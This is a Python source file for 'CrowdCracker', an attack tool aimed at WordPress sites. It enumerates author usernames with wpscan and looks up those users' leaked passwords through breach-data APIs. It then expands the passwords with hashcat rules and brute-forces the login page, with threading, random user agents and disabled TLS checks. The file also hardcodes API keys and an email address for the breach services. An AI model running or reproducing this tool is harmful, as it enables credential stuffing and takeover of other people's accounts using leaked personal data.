# TODO
# Handling the admin/author username
# Generate more passwords with rules
# If WP users are emails, or found emails in dehashed, try them as well


import getopt
import sys
import os
from tracemalloc import start
from unittest import result
import requests
import time
import json
from subprocess import Popen

def help():
  print("Usage: ")
  print('Example: crowdCracker.py --url "https://example.com" --threads 50 --users-enum 10 --ruleset-size 2')
  print("")
  print("   --url (--url-file)                Target url(s) to analyse")
  print("   --proxy (--proxy-file)            Proxies to use during the scan (ip:port@login:pass)")
  print("   --proxy-protocol                  Protocol for the proxies provided (HTTP, HTTPS, SOCKS4, SOCKS5)")
  print("   --no-proxy-check                  Disables checking proxies on startup")
  print("   --threads THREADS                 Set the amount of threads to be used per bruteforce (default: 50)")
  print("   --users-enum USERS                Amount of author IDs to be enumerated")
  print("   --no-password-gen                 Disables generating extra passwords with rules, if original passwords dont work")
  print("   --ruleset-size [1,2,3]            Set the size of built-in ruleset to be used, bigger ruleset will generate more passwords (default: 2)")
  print("   --ruleset FILE                    Specify a custom ruleset")
  print("   --no-colors                       Disables colored output")
  print("")

def error(text):
    print("[31m[!!!][0m " + text)
    print("")
    exit(1)

def warning(text):
    print("[31m[!][0m " + text)

def info(text):
    print("[34m[i][0m " + text)

def success(text):
    print("[33m[+][0m " + text)  

def ignore(text):
    print("[30m[+][0m " + text)  

def spacer():
    print("__________________________________________________________________________________")
    print("")  

def getCLIparam(param):
    if (param not in sys.argv):
        return ""

    if (sys.argv.index(param) > -1):
        return sys.argv[sys.argv.index(param) + 1]

def timer(mode):
    global startTime
    if (mode == 1):
        startTime = int(round(time.time() * 1000)) / 1000
    else:
        endTime = int(round(time.time() * 1000)) / 1000
        print()
        info("Finished in " + str(round(endTime - startTime, 2)) + "s")
        


print("")
print("   ______                       ________                __            ")
print("  / ____/________ _      ______/ / ____/________ ______/ /_____  _____")
print(" / /   / ___/ __ \ | /| / / __  / /   / ___/ __ `/ ___/ //_/ _ \/ ___/")
print("/ /___/ /  / /_/ / |/ |/ / /_/ / /___/ /  / /_/ / /__/ ,< /  __/ /    ")
print("\____/_/   \____/|__/|__/\__,_/\____/_/   \__,_/\___/_/|_|\___/_/     ")
                                                                      

print("")
print("CrowdCracker v1.0.0")
print("")


#Getting CLI argument

if (len(sys.argv) == 1) or ("-h" in sys.argv):
    help()

if ("--url" not in sys.argv) and ("--url-file" not in sys.argv):
        error("--url parameter is missing")

scans = 0
targetArray = []
startTime = 0

if ("--url" in sys.argv):
    targetArray.append(getCLIparam("--url"))
if ("--url-file" in sys.argv):
    with open(getCLIparam("--url-file"), "r") as f:
        data = f.read()
    targetArray = data.split("\n")

info("Targets loaded: " + str(len(targetArray)))
info("Proxies: 0")
print()

while (scans < len(targetArray)):

    spacer()

    #Stage 1 : Enumeration -------------------------------------------------------------------

    scans += 1
    targetUrl = targetArray[scans-1]

    scriptLocation = os.path.dirname(os.path.realpath(__file__))
    if ("//" in targetUrl):
        workingDir = scriptLocation + "/targets/" + targetUrl.split("//")[1].split("/")[0]
    else:
        workingDir = scriptLocation + "/targets" + targetUrl

    usersArray = []
    ignoreArray = []

    if not os.path.exists(workingDir):
        os.mkdir(workingDir)
    if not os.path.exists(workingDir + "/stage1"):
        os.mkdir(workingDir + "/stage1")


    info("Target n. " + str(scans))
    info("URL: " + targetUrl)
    print()
    info("Starting enumeration...")
    print()

    

    if ("--no-wpscan" not in sys.argv):
        if os.path.exists(workingDir + '/stage1/wp_output.txt'):
            os.remove(workingDir + '/stage1/wp_output.txt')
        os.system('cmd /c "wpscan --url ' + targetUrl + ' --enumerate u --disable-tls-checks --no-banner --no-update --random-user-agent" >> ' + workingDir + '/stage1/wp_output.txt')

        with open(workingDir + '/stage1/wp_output.txt', "r") as f:
            data = f.read()

        if ("Scan Aborted:" in data):
            array = data.split("Scan Aborted: ")
            array1 = array[1].split("Use")
            warning("Scan Aborted: " + array1[0])
            continue

        if ("No Users Found." in data):
            warning("No users found")
            continue

        if ("User(s) Identified:" in data):
            with open(workingDir + '/stage1/wp_output.txt', "r") as f:
                linesArray = f.readlines()
            line = linesArray.index("\x1b[34m[i]\x1b[0m User(s) Identified:\n")
            while(True):
                lineContent = linesArray[line]
                if ("Found By: " in lineContent):
                    user = linesArray[line-1].split("[32m[+][0m ")[1].split("\n")[0]
                    if ("Found By: Rss Generator" in lineContent):
                        ignoreArray.append(user)
                    else:
                        usersArray.append(user)
                if ("Finished: " in lineContent):
                    break
                line += 1
            success("Users found: " + str(len(usersArray)))
            print()
            for user in usersArray:
                success(user)
            for user in ignoreArray:
                ignore(user)

    #Stage 2 : Calling the cloud database -------------------------------------------------------------------

    if ("--no-lookup" not in sys.argv):
        print()
        info("Calling cloud databases")
        info("Searching LeakCheck...")
        print()

        for user in usersArray:

            API_ENDPOINT_DEHASHED = "https://api.dehashed.com/search?query=username:" + usersArray[0]
            API_KEY_DEHASHED = "ukhrz6hwgqxob9rx4xez0mn8z1e0avhn"
            API_MAIL_DEHASHED = "qwjjryk@hi2.in"
            data_dehashed = {'api_dev_key':API_KEY_DEHASHED}

            API_KEY_LEAKCHECK = "e3e7bb0b0dcb7f7279dbb7a5a3d558aaecaeb0c0"
            API_ENDPOINT_LEAKCHECK = "https://leakcheck.net/api?key=" + API_KEY_LEAKCHECK + "&check=" + user + "&type=login"

            r = requests.get(url = API_ENDPOINT_LEAKCHECK)
            response = r.text
            jsonData = json.loads(response)
            passArray = []
            #print(response)

            if not os.path.exists(workingDir + "/stage2"):
                os.mkdir(workingDir + "/stage2")

            with open(workingDir + '/stage2/' + user + '_passwords.txt', 'w') as f:
                if (jsonData["success"] == True):
                    for x in jsonData["result"]:
                        password = x["line"].split(":")[1]
                        passArray.append(password)
                        if(len(passArray) < 50): 
                            f.write(password + "\n")
            
            if (len(passArray) > 0):
                success(user + " : " + str(len(passArray)) + " passwords found")
            else:
                warning(user + " : " + str(len(passArray)) + " passwords found")
                continue

            ruleset = "rules/cyclone_250.rule"
            if (getCLIparam("--ruleset-size") == "1"):
                ruleset = "rules/best64.rule"
            if (getCLIparam("--ruleset-size") == "3"):
                ruleset = "rules/toggles5.rule"
                
            if (getCLIparam("--ruleset") != ""):
                if not os.path.exists(getCLIparam("--ruleset")):
                    error("Dictionary path does not exist! (" + getCLIparam("--ruleset") + ")")
                ruleset = getCLIparam("--ruleset")
                
            if os.path.exists(workingDir + '/stage2/' + user + '_passwords_masked.txt'):
                os.remove(workingDir + '/stage2/' + user + '_passwords_masked.txt')
            os.system('cd C:/Users/admin/Desktop/crowdCracker/hashcat/ && hashcat.exe ' + workingDir + '/stage2/' + user + '_passwords.txt -r ' + ruleset + ' --stdout >> ' + workingDir + '/stage2/' + user + '_passwords_masked.txt')  
            
            #print(passArray)

    #Stage 3 : Bruteforcing WP Login -------------------------------------------------------------------

    if ("--no-wpscan" not in sys.argv):
        print()
        info("Starting bruteforce")
        print()

        for user in usersArray:

            passwordsFile = workingDir + '/stage2/' + user + '_passwords_masked.txt'

            if not os.path.exists(passwordsFile):
                passwordsFile = scriptLocation + "/hashcat/dictionaries/10000.txt" 

            info("Trying " + user + "...")

            threads = 5
            if (getCLIparam("--threads") != ""):
                threads = getCLIparam("--threads")

            if not os.path.exists(workingDir + "/stage3"):
                os.mkdir(workingDir + "/stage3")
            
            #print("wpscan --url " + targetUrl + " --passwords " + passwordsFile + " --usernames " + user + " --max-threads " + str(threads) + " --disable-tls-checks --no-banner >> " + workingDir + '/stage3/' + user + "_bruteforce.txt")
            if os.path.exists(workingDir + '/stage3/' + user + "_bruteforce.txt"):
                os.remove(workingDir + '/stage3/' + user + "_bruteforce.txt")
            #os.system("start wpscan --url " + targetUrl + " --passwords " + passwordsFile + " --usernames " + user + " --max-threads " + str(threads) + " --disable-tls-checks --no-banner >> " + workingDir + '/stage3/' + user + "_bruteforce.txt") 
            #p = Popen(["cmd" "/c" "wpscan", "--url", targetUrl, "--passwords", passwordsFile, "--usernames", user, "--max-threads", str(threads), "--disable-tls-checks", "--no-banner", ">>", workingDir, '/stage3/', user, "_bruteforce.txt"])
            p = Popen(["cmd", "/c", "wpscan --url " + targetUrl + " --passwords " + passwordsFile + " --usernames " + user + " --max-threads " + str(threads) + " --disable-tls-checks --no-update --no-banner -f cli-no-color --random-user-agent >> " + workingDir.replace("/", "\\") + '\\stage3\\' + user + "_bruteforce.txt"])

            time.sleep(5)

            while(True):
                with open(workingDir + '/stage3/' + user + "_bruteforce.txt", "r") as f:
                    data = f.read()
                
                if("Progress: " in data):
                    array = data.split("Progress: ")
                    array1 = array[1].split("\n")
                    count = array1[0].count("=")
                    percentage = count / 68
                    sys.stdout.write("[34m[i][0m Progress: " + str(round(percentage*100, 2)) + "%\r")
                    sys.stdout.flush()

                if ("Scan Aborted:" in data):
                    array = data.split("Scan Aborted: ")
                    array1 = array[1].split("Use")
                    warning("Scan Aborted: " + array1[0])
                    break

                
                if ("Finished: " in data):
                    if ("No Valid Passwords Found." in data):
                        warning("No passwords found")
                    else:
                        success("Password found!")

                    p.terminate()
                    print()
                    break

                time.sleep(2)
